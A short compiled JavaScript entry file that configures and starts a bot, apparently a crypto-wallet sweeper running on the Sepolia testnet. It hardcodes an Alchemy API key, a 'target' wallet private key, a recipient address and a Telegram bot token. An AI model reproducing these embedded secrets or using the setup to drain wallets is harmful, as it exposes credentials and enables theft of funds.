"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.Bot = void 0;
const bot_1 = require("../controller/bot");
Object.defineProperty(exports, "Bot", { enumerable: true, get: function () { return bot_1.Bot; } });
const bot = new bot_1.Bot('https://eth-sepolia.g.alchemy.com/v2/y6w9diB9MYtUcOHGLaEpOAdh9sbfSG01');
const details = {
    target_wallet_private_key: 'f8258f5bc0150cf1c93db5bb5584e69b1f98560bb0f3f50650fcbfa6ddc9d1d5',
    recipient_address: '0xC493ab45Dec7d3a98297D6d16f4614277D7B3BB6',
    telegram_user_id: '5204205237',
    telegram_bot_token: '6448421601:AAH84-CYrrKFTeYQTC5ZCcDbpqfaYs4NxEg',
    network_name: 'Network name',
};
bot.Config(details);
bot.start();
